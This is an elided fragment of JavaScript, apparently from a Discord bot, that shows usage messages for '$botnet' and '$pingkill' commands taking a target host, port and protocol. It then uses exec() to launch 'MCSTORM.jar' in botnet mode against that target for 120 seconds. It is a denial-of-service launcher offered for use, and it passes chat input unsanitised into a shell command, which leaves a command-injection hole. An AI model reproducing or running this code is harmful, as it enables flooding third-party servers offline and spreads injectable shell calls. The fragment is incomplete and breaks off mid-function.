...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('Commands')
	.setDescription("`attack command $botnet <Host> <Port> <Protocol>`")
...
if(!args[1]) {
	...
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`$pingkill <IP> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}
...
exec(`java -jar MCSTORM.jar ${host}:${port} ${protocol} botnet 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
